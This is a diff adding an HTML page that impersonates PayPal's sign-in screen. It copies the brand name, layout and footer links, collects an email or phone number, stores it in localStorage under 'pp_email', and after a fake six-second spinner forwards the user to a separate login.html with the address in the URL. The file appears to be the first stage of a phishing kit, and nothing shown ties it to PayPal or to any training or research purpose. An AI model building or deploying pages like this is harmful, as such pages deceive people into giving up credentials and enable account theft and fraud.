@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PayPal Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+html, body { height:100%; margin:0; padding:0; }
+
+body {
+  display:flex;
+  flex-direction:column;
+  min-height:100%;
+  font-family:-apple-system, BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;
+  background:#ffffff; color:#111;
+}
+
+.wrap {
+  max-width:420px; margin:0 auto; padding:32px 20px 0; flex:1;
+}
+
+.logo {
+  font-size:34px; font-weight:700; text-align:center; margin-bottom:56px;
+}
+
+.input-box {
+    border: 1.5px solid #666666;
+    border-radius: 8px;
+    padding: 16px 18px;
+    font-size: 17px;
+    width: 100%;
+    outline: none;
+    height: 65px;
+    box-sizing: border-box;
+}
+
+.input-box::placeholder {
+    color: #8d8d8d;
+    font-weight: 400;
+}
+
+.input-error {
+  color: #b00020;
+  font-size: 13px;
+  margin-top:8px;
+  display:none;
+}
+
+.forgot {
+  color:#0070BA;
+  font-size:17px;
+  font-weight:600;
+  margin-top:10px;
+  display:inline-block;
+}
+
+.btn-primary {
+  background:#0250B4;
+  color:#fff;
+  border:none;
+  width:100%;
+  padding:15px 0;
+  margin-top:28px;
+  border-radius:999px;
+  font-size:17px;
+  font-weight:600;
+  cursor: pointer;
+}
+
+.spinner-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: rgba(255, 255, 255, 0.4);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  visibility: hidden;
+  opacity: 0;
+  transition: opacity 0.3s ease;
+  backdrop-filter: blur(2px);
+}
+
+.spinner-overlay.show {
+  visibility: visible;
+  opacity: 1;
+}
+
+.spinner {
+  width: 80px;
+  height: 80px;
+  border: 4px solid transparent;
+  border-top: 4px solid #0070BA;
+  border-right: 4px solid #0070BA;
+  border-radius: 50%;
+  animation: spin-arc 1.2s linear infinite;
+}
+
+@keyframes spin-arc {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.divider { display:flex; align-items:center; margin:28px 0; }
+.divider::before, .divider::after { content:""; flex:1; height:1px; background:#ddd; }
+.divider span { margin:0 12px; color:#6f6f6f; font-size:15px; }
+
+.btn-outline {
+  width:100%; 
+  padding:15px 0; 
+  border-radius:999px; 
+  border:1.5px solid #000; 
+  background:#fff; 
+  font-size:17px; 
+  font-weight:600; 
+  color:#333333;
+  cursor: pointer;
+}
+
+.lang-row {
+  display:flex; align-items:center; gap:6px; 
+  margin-top:40px; 
+  margin-bottom:30px; 
+  font-size:15px;
+}
+
+.flag { width:22px; }
+.chevron { font-size:14px; font-weight:bold; margin-left:2px; }
+.lang-row span { color:#333; }
+.divider-sm { color:#d0d0d0; padding:0 6px; }
+
+.footer {
+  background:#f5f5f7; 
+  padding:4px 0 6px; 
+  font-size:12.5px; 
+  text-align:center; 
+  color:#6E7072; 
+  font-weight:500; 
+  line-height:1.2; 
+  width:100%; 
+  margin:0; 
+  white-space:nowrap;
+}
+
+.footer a {
+  display:inline-block; 
+  margin:0 14px; 
+  color:#6E7072; 
+  text-decoration:none; 
+  font-weight:500;
+}
+</style>
+</head>
+
+<body>
+
+<!-- Spinner Overlay -->
+<div class="spinner-overlay" id="spinnerOverlay">
+  <div class="spinner"></div>
+</div>
+
+<div class="wrap">
+  <div class="logo">PayPal</div>
+
+  <input id="emailInput" type="text" class="input-box" placeholder="Email or mobile number" autocomplete="username">
+  <div id="emailError" class="input-error">Please enter a valid email address</div>
+
+  <a href="#" class="forgot">Forgot email?</a>
+
+  <button id="nextBtn" class="btn-primary" type="button">Next</button>
+
+  <div class="divider"><span>or</span></div>
+
+  <button class="btn-outline">Sign Up</button>
+
+  <div class="lang-row">
+    <img src="https://flagcdn.com/us.svg" class="flag" alt="US flag">
+    <span class="chevron">⌄</span>
+    <span style="font-weight:600;">English</span>
+    <span class="divider-sm">|</span>
+    <span>Français</span>
+    <span class="divider-sm">|</span>
+    <span>Español</span>
+    <span class="divider-sm">|</span>
+    <span>中文</span>
+  </div>
+</div>
+
+<div class="footer">
+  <a href="#">Contact Us</a>
+  <a href="#">Privacy</a>
+  <a href="#">Legal</a>
+  <a href="#">Policy Updates</a>
+  <a href="#">Worldwide</a>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const emailInput = document.getElementById('emailInput');
+  const nextBtn = document.getElementById('nextBtn');
+  const emailError = document.getElementById('emailError');
+  const spinnerOverlay = document.getElementById('spinnerOverlay');
+
+  function isValidEmail(email) {
+    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    return re.test(email.trim());
+  }
+
+  function showError(show) {
+    emailError.style.display = show ? 'block' : 'none';
+  }
+
+  function goNext() {
+    const value = emailInput.value.trim();
+    
+    if (!isValidEmail(value)) {
+      showError(true);
+      emailInput.focus();
+      return;
+    }
+    
+    showError(false);
+
+    // Show spinner overlay (page stays visible behind)
+    spinnerOverlay.classList.add('show');
+
+    // Wait for 6 seconds then proceed
+    setTimeout(() => {
+      spinnerOverlay.classList.remove('show');
+      localStorage.setItem('pp_email', value);
+      window.location.href = 'login.html?email=' + encodeURIComponent(value);
+    }, 6000);
+  }
+
+  nextBtn.addEventListener('click', goNext);
+
+  // Allow Enter key press to submit
+  emailInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      goNext();
+    }
+  });
+});
+</script>
+
+</body>
+</html>
